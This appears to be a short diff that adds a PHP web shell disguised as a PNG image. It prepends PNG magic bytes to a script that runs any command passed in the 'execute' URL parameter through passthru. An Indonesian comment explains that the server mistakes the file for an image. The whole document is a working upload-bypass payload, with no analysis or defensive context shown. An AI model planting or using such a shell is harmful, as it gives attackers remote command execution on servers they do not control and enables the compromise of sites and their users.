@@ -1,0 +1,6 @@
+\x89PNG\r\n\x1a\n
+<?php
+// Server mengira ini PNG karena 4 byte pertama di atas
+@passthru($_GET['execute']);
+?>
+
